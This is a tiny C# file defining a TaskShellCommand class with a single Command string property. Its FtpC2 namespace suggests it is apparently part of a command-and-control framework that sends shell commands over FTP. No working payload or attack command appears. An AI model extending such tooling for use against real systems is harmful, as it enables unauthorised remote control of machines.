﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FtpC2.Tasks
{
    public class TaskShellCommand : TaskWrapper
    {
        public string? Command { get; set; }
    }
}
